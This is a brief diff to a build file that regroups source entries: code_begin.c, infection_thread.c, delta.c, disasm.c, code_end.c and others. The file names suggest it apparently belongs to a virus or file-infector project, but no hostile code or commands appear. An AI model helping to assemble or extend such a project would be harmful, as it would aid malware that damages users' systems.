@@ -1,3 +1,5 @@
+add_sources(code_begin.c)
+
 add_sources(
     code_begin.c
     infection_thread.c
@@ -10,6 +12,8 @@ add_sources(
     checksum.c
     process_info.c
     delta.c
-    disasm.c
-	memory.c
-    code_end.c)
+	memory.c)
+
+add_subdirectory(disasm)
+
+add_sources( code_end.c)
